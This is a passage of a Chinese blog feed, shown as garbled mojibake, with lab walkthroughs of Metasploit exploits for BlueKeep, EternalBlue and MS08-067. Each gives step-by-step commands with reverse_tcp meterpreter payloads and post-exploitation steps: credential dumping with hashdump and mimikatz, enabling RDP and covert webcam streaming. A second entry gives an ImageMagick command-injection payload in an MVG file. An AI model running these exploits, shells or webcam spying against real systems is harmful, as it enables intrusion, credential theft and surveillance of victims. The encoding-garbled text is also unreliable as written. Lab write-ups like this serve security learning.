createdï¼Œå»ºè®®åˆ©ç”¨ä¸€æ¬¡å»ºè®®è¯•ä¸€æ¬¡é‡å¯é¶æœºä¸€æ¬¡ï¼Œæé«˜æˆåŠŸç‡ã€‚</p><p><strong>æ”»å‡»æœº</strong>ï¼škali  IP:192.168.70.152ï¼ˆæ³¨æ„metasploitæœ€å¥½æ›´æ–°åˆ°5.xä»¥ä¸Šç‰ˆæœ¬ä¸ç„¶å¯èƒ½ä¼šå‡ºé”™ï¼‰<br><strong>é¶æœº</strong>ï¼š win7   IP:192.168.70.153ï¼ˆå¼€æ”¾3389ç«¯å£ï¼Œå…³é—­é˜²ç«å¢™ï¼‰</p><h4 id="å·¥å…·å‡†å¤‡"><a href="#å·¥å…·å‡†å¤‡" class="headerlink" title="å·¥å…·å‡†å¤‡"></a>å·¥å…·å‡†å¤‡</h4><p>ç°é˜¶æ®µexpè¿˜æ²¡æœ‰å¹¶å…¥msfä¸­ï¼Œéœ€è¦è‡ªå·±ä¸‹è½½å¯¼å…¥ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/</span><br><span class="line">cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/</span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/</span><br><span class="line">cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</span><br></pre></td></tr></table></figure><h4 id="å¤ç°è¿‡ç¨‹"><a href="#å¤ç°è¿‡ç¨‹" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h4><p>æ‰«ä¸€ä¸‹ç›®æ ‡ä¸»æœºç¡®è®¤å…¶å¼€æ”¾3389ç«¯å£</p><p><img src="https://s2.ax1x.com/2019/09/09/ntV61J.png" alt="ntV61J.png"></p><p>è¿›å…¥msfåä½¿ç”¨<code>reload_all</code>é‡æ–°åŠ è½½0708rdpåˆ©ç”¨æ¨¡å—ï¼Œ</p><p><img src="https://s2.ax1x.com/2019/09/09/ntn656.png" alt="ntn656.png"></p><p>ä½¿ç”¨å‘½ä»¤<code>search 0708</code> æŸ¥æ‰¾ç›¸å…³æ¨¡å—ï¼Œç¬¬ä¸€ä¸ªå’Œç¬¬å››ä¸ªåˆ†åˆ«æ˜¯æ‰«æå’Œåˆ©ç”¨çš„æ¨¡å—</p><p><img src="https://s2.ax1x.com/2019/09/09/ntu9I0.png" alt="ntu9I0.png"></p><p> å¯ä»¥å…ˆä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—å»æ‰«æé¶æœºæ˜¯å¦å­˜åœ¨å½“å‰æ¼æ´ï¼Œä½¿ç”¨<code>info</code>æŸ¥è¯¢æˆ‘ä»¬éœ€è¦é…ç½®çš„å†…å®¹ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦é…ç½®è¿œç¨‹ipåœ°å€rhostså±æ€§å³å¯ï¼Œé»˜è®¤3389ç«¯å£ï¼Œä¸éœ€è¦ä¿®æ”¹</p><p><img src="https://s2.ax1x.com/2019/09/09/ntuQJK.png" alt="ntuQJK.png"></p><p><code>set rhosts 192.168.70.153</code>ä¹‹åå°±å¯ä»¥æ„‰å¿«åœ°runäº†ï¼Œå¯ä»¥å‘ç°å­˜åœ¨è¯¥æ¼æ´</p><p><img src="https://s2.ax1x.com/2019/09/09/ntu2oq.png" alt="ntu2oq.png">ä¹‹åæ¢å¦å¤–ä¸€ä¸ªåˆ©ç”¨çš„æ¨¡å—ï¼Œ<code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code>ï¼ŒåŒæ ·å¯ä»¥å…ˆä½¿ç”¨infoæŸ¥çœ‹éœ€è¦é…ç½®çš„ç›¸å…³å±æ€§ï¼Œé™¤äº†è·Ÿåˆšæ‰ä¸€æ ·çš„è®¾ç½®ipçš„å±æ€§ï¼Œè¿˜è¦æ³¨æ„è¿™ä¸ªæ¨¡å—å­˜åœ¨è¿™æ ·çš„ä¸€ä¸ªtargetå±æ€§ï¼Œè¿™æ˜¯ä¸€ä¸ªå‘ç‚¹ï¼Œè¿™é‡Œè§„å®šäº†é¶æœºçš„æ¶æ„ï¼Œè¿™é‡Œæˆ‘æ˜¯åœ¨è™šæ‹Ÿæœºé‡Œé¢å®Œæˆçš„æ‰€ä»¥é€‰æ‹©3ï¼Œå‘½ä»¤å°±æ˜¯<code>set target 3</code></p><p><img src="https://s2.ax1x.com/2019/09/09/ntKRnH.png" alt="ntKRnH.png"></p><p>å¦‚æœç›´æ¥é»˜è®¤ä¼šæ€æ ·ï¼Œå¯èƒ½å°±ä¼šå¦‚ä¸‹å›¾:)ï¼Œè“å±è­¦å‘Š23333ã€‚ã€‚</p><p><img src="https://s2.ax1x.com/2019/09/09/ntM4r4.png" alt="ntM4r4.png"></p><p>è®¾ç½®å¥½rhostsä¸º192.168.70.153ä¹‹årunä¸€å‘ï¼Œå¯ä»¥çœ‹åˆ°æƒé™ç›´æ¥æ˜¯systemæƒé™äº†ï¼Œä¸ºæ‰€æ¬²ä¸ºäº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/09/09/nN9PsK.png" alt="nN9PsK.png"></p><h3 id="MS17-010-æ°¸æ’ä¹‹è“"><a href="#MS17-010-æ°¸æ’ä¹‹è“" class="headerlink" title="MS17-010(æ°¸æ’ä¹‹è“)"></a>MS17-010(æ°¸æ’ä¹‹è“)</h3><p>Eternalblueé€šè¿‡TCPç«¯å£445å’Œ139æ¥åˆ©ç”¨SMBv1å’ŒNBTä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¶æ„ä»£ç ä¼šæ‰«æå¼€æ”¾445æ–‡ä»¶å…±äº«ç«¯å£çš„Windowsæœºå™¨ï¼Œæ— éœ€ç”¨æˆ·ä»»ä½•æ“ä½œï¼Œåªè¦å¼€æœºä¸Šç½‘ï¼Œä¸æ³•åˆ†å­å°±èƒ½åœ¨ç”µè„‘å’ŒæœåŠ¡å™¨ä¸­æ¤å…¥å‹’ç´¢è½¯ä»¶ã€è¿œç¨‹æ§åˆ¶æœ¨é©¬ã€è™šæ‹Ÿè´§å¸æŒ–çŸ¿æœºç­‰æ¶æ„ç¨‹åºã€‚</p><h4 id="æ¼æ´ç¯å¢ƒ-1"><a href="#æ¼æ´ç¯å¢ƒ-1" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h4><p><strong>æ”»å‡»æœº</strong>ï¼škali  IP: 192.168.70.152<br><strong>é¶æœº</strong>ï¼š win7   IP: 192.168.70.153ï¼ˆå¼€æ”¾445ç«¯å£ï¼Œå…³é—­é˜²ç«å¢™ï¼‰</p><h4 id="å¤ç°è¿‡ç¨‹-1"><a href="#å¤ç°è¿‡ç¨‹-1" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h4><p>å…ˆä½¿ç”¨nmapæ‰«æä¸€æ³¢ä¸»æœºçš„ç«¯å£å­˜æ´»æ€§ï¼Œ<code>nmap -sS -p 445 192.168.70.153</code></p><p><img src="https://s2.ax1x.com/2019/09/09/nNCDjP.png" alt="nNCDjP.png"></p><p>ä½¿ç”¨å‘½ä»¤<code>msfconsole</code>è¿›å…¥msfï¼Œç„¶å<code>search ms17-010</code>æŸ¥æ‰¾å¯¹åº”çš„æ¨¡å—ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢å­˜åœ¨å¯¹åº”çš„æ‰«ææ¨¡å—ä»¥åŠåˆ©ç”¨æ¨¡å—</p><p><img src="https://s2.ax1x.com/2019/09/09/nNCbEF.png" alt="nNCbEF.png"></p><p>ç„¶åè¿™é‡Œæˆ‘ä½¿ç”¨ç¬¬äºŒä¸ªæ¨¡å—å»æ¢æµ‹ä¸»æœºæ˜¯å¦å­˜åœ¨è¯¥æ¼æ´ï¼Œ<code>use auxiliary/scanner/smb/smb_ms17_010</code>ï¼Œç„¶åä½¿ç”¨<code>info</code>å‘½ä»¤æŸ¥çœ‹æˆ‘ä»¬æ‰€éœ€è¦é…ç½®çš„ä¸€äº›ä¿¡æ¯ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦é…ç½®çš„ä¹Ÿæ˜¯ä¸€ä¸ªrhostsï¼Œå› ä¸ºä»–çš„requiredä¹Ÿæ˜¯yesï¼Œæ˜¯å¿…é¡»çš„ï¼Œå…¶ä»–çš„ç«¯å£å·å•¥çš„ä½¿ç”¨é»˜è®¤çš„445ï¼Œå¿…è¦æ—¶å€™æˆ‘ä»¬ä¹Ÿæ˜¯éœ€è¦æ”¹å˜ç«¯å£å·çš„</p><p><img src="https://s2.ax1x.com/2019/09/09/nNPF4H.png" alt="nNPF4H.png"></p><p>ç„¶å<code>set rhosts 192.168.70.153</code> ä¹‹åæ‰§è¡Œ <code>run</code>å‘½ä»¤ï¼Œå‘ç°ç–‘ä¼¼å­˜åœ¨è¯¥æ¼æ´</p><p><img src="https://s2.ax1x.com/2019/09/10/nNPtK0.png" alt="nNPtK0.png"></p><p>ç„¶åä¸‹é¢å°±å¼€å§‹ä½¿ç”¨æ”»å‡»æ¨¡å—äº†ï¼Œè¿™æ¬¡é™¤äº†è®¾ç½®ä¸€ä¸‹lhostï¼Œrhostä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è®¾ç½®ä¸€ä¸‹payloadå±æ€§ï¼Œä½¿ç”¨ä¸€äº›msfè‡ªå¸¦çš„ä¸€äº›åå¼¹shellçš„æ¨¡å—ï¼Œæ›´å¤šåŠŸèƒ½XDï¼Œè¯¦ç»†çš„è¯æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨<code>show payloads</code>å‘½ä»¤å»æŸ¥çœ‹</p><p><img src="https://s2.ax1x.com/2019/09/10/nN8Ai9.png" alt="nN8Ai9.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost 192.168.70.152   <span class="comment">#è®¾å®šæ”»å‡»æœº</span></span><br><span class="line"><span class="built_in">set</span> rhost 192.168.70.153   <span class="comment">#è®¾å®šé¶æœº</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">run   <span class="comment">#è¿è¡Œ</span></span><br></pre></td></tr></table></figure><p>åŠŸèƒ½æˆåŠŸï¼Œå¯ä»¥ä½¿ç”¨msfä¸­<code>reverse_tcp</code>é‡Œé¢çš„ä¸€äº›å‘½ä»¤äº†</p><p><img src="https://s2.ax1x.com/2019/09/10/nNGM60.png" alt="nNGM60.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getuid<span class="comment">#æŸ¥çœ‹å½“å‰æƒé™</span></span><br><span class="line">sysinfo<span class="comment">#æŸ¥çœ‹é¶æœºä¿¡æ¯</span></span><br><span class="line">shell<span class="comment">#è·å–shell</span></span><br><span class="line">chcp 65001<span class="comment">#shellä¸­æ–‡è¯†åˆ«</span></span><br><span class="line">hashdump   <span class="comment">#å¥½åƒåªæœ‰ç®¡ç†å‘˜æ‰èƒ½ç”¨</span></span><br><span class="line"><span class="built_in">pwd</span>    <span class="comment">#æŸ¥çœ‹å½“å‰ç›®å½•</span></span><br><span class="line">ps  <span class="comment">#æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><p>emmmï¼Œæœ‰ç‚¹æ— è„‘ï¼Œä¹Ÿæ˜¯ç›´æ¥è·å¾—systemæƒé™çš„</p><p><img src="https://s2.ax1x.com/2019/09/10/nNGYtJ.png" alt="nNGYtJ.png"></p><p>ä¸»è¦åœ¨è¿™ä¸ªpayloadæ¨¡å—ä¸‹è¿˜æœ‰å…¶ä»–å¥½ç©çš„ä¸œè¥¿</p><h5 id="è·å–ç”¨æˆ·å¯†ç "><a href="#è·å–ç”¨æˆ·å¯†ç " class="headerlink" title="è·å–ç”¨æˆ·å¯†ç "></a>è·å–ç”¨æˆ·å¯†ç </h5><p>è¿™ä¸ªå¥½åƒæ˜¯åªèƒ½è·å–å½“å‰ç™»å½•çš„ç”¨æˆ·çš„ç”¨æˆ·åå¯†ç ï¼Œä¸ç„¶çš„è¯å¥½åƒåŠ è½½ä¸å‡ºæ¥å¯†ç çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz<span class="comment">#è½½å…¥mimikatz</span></span><br><span class="line">wdigest</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/10/nNGq9s.png" alt="nNGq9s.png"></p><h5 id="å¼€å¯è¿œç¨‹æ¡Œé¢"><a href="#å¼€å¯è¿œç¨‹æ¡Œé¢" class="headerlink" title="å¼€å¯è¿œç¨‹æ¡Œé¢"></a>å¼€å¯è¿œç¨‹æ¡Œé¢</h5><p>å¯ä»¥å¼€å¯3389ç«¯å£å¹¶ä¸”é¡ºä¾¿å…³æ‰é˜²ç«å¢™2333</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p>Linuxä¸‹è¿æ¥rdpï¼Œå…ˆè®°ç€ï¼Œæ€•å¿˜äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.70.153 -u user -p passw0rd</span><br></pre></td></tr></table></figure><h5 id="ä¸Šä¼ -ä¸‹è½½æ–‡ä»¶"><a href="#ä¸Šä¼ -ä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ /ä¸‹è½½æ–‡ä»¶"></a>ä¸Šä¼ /ä¸‹è½½æ–‡ä»¶</h5><p>è¿™ä¸ªä¸€èˆ¬åœ¨æœ‰å†…ç½‘çš„æ—¶å€™æ¯”è¾ƒå¥½ç”¨ï¼Œä¸Šä¼ ä¸ªä»£ç†ï¼Œæ‰«æå™¨å•¥çš„ï¼Œå¯ä»¥è¿›è¡Œå†…ç½‘æ¸—é€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download /</span><br><span class="line">upload /file</span><br></pre></td></tr></table></figure><h5 id="æˆªå±"><a href="#æˆªå±" class="headerlink" title="æˆªå±"></a>æˆªå±</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot</span><br></pre></td></tr></table></figure><h5 id="å¼€å¯æ‘„åƒå¤´"><a href="#å¼€å¯æ‘„åƒå¤´" class="headerlink" title="å¼€å¯æ‘„åƒå¤´"></a>å¼€å¯æ‘„åƒå¤´</h5><p>ä¸ªäººæœ€å–œæ¬¢è¿™ä¸ªæ“ä½œXDï¼Œä¸è§£é‡Šã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_stream</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/10/nNYZzn.png" alt="nNYZzn.png"></p><h3 id="MS-08067"><a href="#MS-08067" class="headerlink" title="MS-08067"></a>MS-08067</h3><p>æ”»å‡»è€…åˆ©ç”¨å—å®³è€…ä¸»æœºé»˜è®¤å¼€æ”¾çš„SMBæœåŠ¡ç«¯å£445ï¼Œå‘é€ç‰¹æ®ŠRPCï¼ˆRemote Procedure Call è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰è¯·æ±‚ï¼Œé€ æˆäº†æ ˆç¼“å†²åŒºå†…å­˜é”™è¯¯ï¼Œé€ æˆå¯è¢«åˆ©ç”¨å®æ–½è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å½±å“èŒƒå›´ï¼šWindowsç³»ç»Ÿï¼ŒåŒ…æ‹¬ï¼šWindows 2000/XP/Server 2003/Vista/Server 2008çš„å„ä¸ªç‰ˆæœ¬</p><h4 id="æ¼æ´ç¯å¢ƒ-2"><a href="#æ¼æ´ç¯å¢ƒ-2" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h4><p><strong>æ”»å‡»æœº</strong>ï¼škali  IP: 192.168.70.152<br><strong>é¶æœº</strong>ï¼š win xp sp2   IP: 192.168.70.155ï¼ˆå…³é—­é˜²ç«å¢™ï¼‰</p><h4 id="å¤ç°è¿‡ç¨‹-2"><a href="#å¤ç°è¿‡ç¨‹-2" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h4><p>æ ¹æ®æ¼æ´æè¿°å°±æ˜¯è¯´ä¹Ÿæ˜¯éœ€è¦æ‰“å¼€445ç«¯å£çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥ç¡®è®¤ä¸€ä¸‹445ç«¯å£æ˜¯å¦å¼€å¯</p><p><img src="https://s2.ax1x.com/2019/09/10/nUma7R.png" alt="nUma7R.png"></p><p>ç„¶å<code>msfconsole</code>è¿›å…¥msfï¼Œç„¶å<code>search 08-067</code>æŸ¥æ‰¾ç›¸å…³æ¨¡å—ï¼Œuseé‚£ä¸ªæ¨¡å—å³å¯ï¼Œä½¿ç”¨<code>info</code>æŸ¥çœ‹ç›¸å…³çš„ä¿¡æ¯</p><p><img src="https://s2.ax1x.com/2019/09/10/nN6rHH.png" alt="nN6rHH.png"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥è®¾ç½®rhostï¼Œpayloadï¼Œlhost</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 192.168.70.155</span><br><span class="line"><span class="built_in">set</span> payload  windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.70.152</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/10/nUns5q.png" alt="nUns5q.png"></p><p>è¿™é‡Œé¢çš„targetå±æ€§æˆ‘ä»¬è®¾ç½®ä¸º5ï¼Œé€‰æ‹©xp sp2çš„è‹±æ–‡ç‰ˆï¼Œå¦‚æœæ²¡é€‰å¯¹å¾ˆå¯èƒ½å‡ºç°ä¸‹é¢çš„æƒ…å†µ</p><p><img src="https://s2.ax1x.com/2019/09/10/nUmycD.png" alt="nUmycD.png"></p><p>runä¹‹åå¯ä»¥å‘ç°åŒæ ·æ˜¯systemæƒé™åˆå¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†XD</p><p><img src="https://s2.ax1x.com/2019/09/10/nUnOMD.png" alt="nUnOMD.png"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>1.æœ‰äº›å‘ç‚¹è¿˜æ˜¯éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œå…³äºset targetçš„é—®é¢˜ï¼Œæœ€å¥½è¿˜æ˜¯è‡ªå·±æ‰‹åŠ¨è®¾ç½®ä¸€ä¸‹å§ï¼Œä¸ç„¶ç›´æ¥ä½¿ç”¨é»˜è®¤çš„targetä¼šå¯èƒ½å‡ºç°å„ç§å„æ ·çš„é—®é¢˜ï¼Œæ¯•ç«Ÿè¿™äº›æ¶æ„é—®é¢˜ä¸æ˜¯æˆ‘è¿™ä¸ªæ°´å¹³æå¾—å®šçš„ï¼Œæˆ‘å¤ªèœäº†:)</p><p>2.msfå¸¸ç”¨çš„å°±é‚£å‡ ä¸ªå‘½ä»¤ï¼Œç†Ÿç»ƒå°±å¥½äº†ï¼Œå¯èƒ½è¿˜æœ‰å…¶ä»–éªšæ“ä½œï¼Œä»¥åé‡åˆ°å†å­¦å§ï¼Œä½†æ˜¯å¬è¯´åœ¨å†…ç½‘æ¸—é€çš„æ—¶å€™ä¸å¤ªç”¨ï¼Œæµé‡å¤ªå¤§äº†ã€‚</p>]]></content>
      
      <categories>
          
          <category> metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ImageMagickå‘½ä»¤æ‰§è¡Œ</title>
      <link href="/ImageMagick.html"/>
      <url>/ImageMagick.html</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨ç ”ç©¶disable_functionçš„ä¸€äº›ç»•è¿‡æŠ€å·§ï¼Œå‘ç°äº†è¿™ä¸ªç»„ä»¶å¯¼è‡´çš„ä¸€äº›å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ„Ÿè§‰å¾ˆæœ‰è¶£ï¼Œäºæ˜¯å­¦ä¹ ä¸€ä¸‹ï¼Œåšä¸ªè®°å½•<a id="more"></a>ã€‚</p><p>ImageMagickæ˜¯ä¸€æ¬¾ä½¿ç”¨é‡å¾ˆå¹¿çš„å›¾ç‰‡å¤„ç†ç¨‹åºï¼Œå¾ˆå¤šå‚å•†éƒ½è°ƒç”¨äº†è¿™ä¸ªç¨‹åºè¿›è¡Œå›¾ç‰‡å¤„ç†ï¼Œè¿™ä¸œè¥¿å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯å‡ºåœ¨ImageMagickå¯¹httpså½¢å¼çš„æ–‡ä»¶å¤„ç†çš„è¿‡ç¨‹ä¸­ã€‚ç”±äºå­˜åœ¨ä¸€ä¸ªå§”æ‰˜Delegateçš„åŠŸèƒ½ï¼Œæ¯ä¸ªDelegateå¯¹åº”ä¸€ç§æ ¼å¼çš„æ–‡ä»¶,ç„¶åé€šè¿‡ç³»ç»Ÿçš„system()å‘½ä»¤æ¥è°ƒç”¨å¤–éƒ¨çš„ç¨‹åºå¯¹æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œå…³é”®ç‚¹å°±åœ¨äºè¾“å…¥çš„å†…å®¹æ²¡åšè¿‡æ»¤ï¼Œå¯ä»¥å¯¼è‡´ä¸€ä¸ªé—­åˆè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ä¸‹é¢æˆ‘å°±ç”¨vulhubä¸Šé¢çš„ä¸€ä¸ªç¯å¢ƒå»å¤ç°ä¸€ä¸‹</p><p>å¯ä»¥çœ‹ä¸€ä¸‹pç‰›çš„è¿™ç¯‡<a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œå¯¹é‡Œé¢çš„å†…å®¹è®²çš„å¾ˆè¯¦ç»†äº†ï¼Œæ€ä¹ˆè§¦å‘ã€‚ç„¶åå¯ä»¥ä»è¿™ä¸ª<a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347" target="_blank" rel="noopener">æ–‡ä»¶</a>ä¸­èƒ½å¤Ÿå‘ç°è¿™ä¸€è¡Œä»£ç ï¼Œå½“ç„¶è¿™åªæ˜¯å…¶ä¸­çš„ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼Œè¿˜å¯ä»¥åˆ©ç”¨å…¶ä»–çš„commandå»è§¦å‘ï¼Œpç‰›çš„æ–‡ç« ä¹Ÿè®²äº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnHLVI.png" alt="ZnHLVI.png"></p><p>æˆ‘æ¯”è¾ƒæ³¨æ„çš„æ˜¯commandå®šä¹‰äº†ä»–å…·ä½“å¸¦å…¥system()æ‰§è¡Œçš„å‘½ä»¤ä¸º:â€wgetâ€ -q -O â€œ%oâ€ â€œhttps:%Mâ€ã€‚</p><p>è¿™é‡Œé¢å¯ä»¥æ³¨æ„åˆ°æœ‰å‡ ä¸ªå ä½ç¬¦ï¼Œå ä½ç¬¦çš„æ„æ€å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">%i  input image filename</span><br><span class="line">%o  output image filename</span><br><span class="line">%u  unique temporary filename</span><br><span class="line">%Z  unique temporary filename</span><br><span class="line">%#  input image signature</span><br><span class="line">%b  image file size</span><br><span class="line">%c  input image comment</span><br><span class="line">%g  image geometry</span><br><span class="line">%h  image rows (height)</span><br><span class="line">%k  input image number colors</span><br><span class="line">%l  image label</span><br><span class="line">%m  input image format</span><br><span class="line">%p  page number</span><br><span class="line">%q  input image depth</span><br><span class="line">%s  scene number</span><br><span class="line">%w  image columns (width)</span><br><span class="line">%x  input image x resolution</span><br><span class="line">%y  input image y resolution</span><br></pre></td></tr></table></figure><p>%mè¢«å®šä¹‰ä¸ºè¾“å…¥çš„å›¾ç‰‡æ ¼å¼ï¼Œå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„urlåœ°å€ã€‚å¯¹äºæ­¤å¤„å¯ä»¥åšä¸€ä¸ªå­—ç¬¦ä¸²çš„é—­åˆæ‹¼æ¥å¯¼è‡´ä¸€ä¸ªå¯æ§çš„é€¸å‡ºç‚¹ã€‚</p><p>å½“è¾“å…¥çš„æ˜¯è¿™æ ·çš„æ˜¯è¿™æ ·ä¸€ä¸ªä¾‹å­çš„æ—¶å€™ï¼Œ<code>https://www.a.com&quot;|ls &quot;-la</code>ï¼Œæ‹¼æ¥åˆ°ä¸Šé¢çš„å­—ç¬¦ä¸²å°±æ˜¯â€wgetâ€ -q -O â€œ%oâ€ â€œhttps:<a href="http://www.a.com&quot;|ls" target="_blank" rel="noopener">www.a.com&quot;|ls</a> â€œ-laâ€ ï¼Œç›¸å½“äºæˆ‘ä»¬å¯ä»¥æ‰§è¡Œls -laçš„å‘½ä»¤</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnOSxO.png" alt="ZnOSxO.png"></p><h3 id="æ„é€ å›¾ç‰‡åˆ©ç”¨"><a href="#æ„é€ å›¾ç‰‡åˆ©ç”¨" class="headerlink" title="æ„é€ å›¾ç‰‡åˆ©ç”¨"></a>æ„é€ å›¾ç‰‡åˆ©ç”¨</h3><p>ImageMagickæ”¯æŒé€šè¿‡.svgã€.mvg(ImageMagickè‡ªå®šä¹‰çš„ä¸€ç§ç±»ä¼¼svgçš„æ ¼å¼)ï¼Œè¿™ç§ç±»å‹çš„æ–‡ä»¶æ¥è¿›è¡Œå›¾å½¢ç»˜åˆ¶ï¼Œå¹¶å…è®¸åœ¨å…¶ä¸­åŠ è½½å…¶ä»–çš„delegate(æ¯”å¦‚å­˜åœ¨æ¼æ´çš„https delegate)ã€‚å¹¶ä¸”åœ¨å›¾å½¢å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼ŒImageMagickä¼šè‡ªåŠ¨æ ¹æ®å…¶å†…å®¹è¿›è¡Œå¤„ç†ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°†æ–‡ä»¶éšæ„å®šä¹‰ä¸ºpngã€jpgç­‰ç½‘ç«™ä¸Šä¼ å…è®¸çš„æ ¼å¼ï¼Œè¿™å°±å¢åŠ äº†å¾ˆå¤šåˆ©ç”¨åœºæ™¯ã€‚</p><p>ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œåœ¨urlæ‹¬å·å†…è¿›è¡Œé—­åˆï¼Œå¹¶ä¸”æ³¨å…¥ä½ è‡ªå·±éœ€è¦çš„å‘½ä»¤ï¼Œå¤šæ¡å‘½ä»¤ç”¨é€—å·åˆ†å‰²å³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://a.com/image.jpg&quot;|id; &quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/27/ZnjpHH.png" 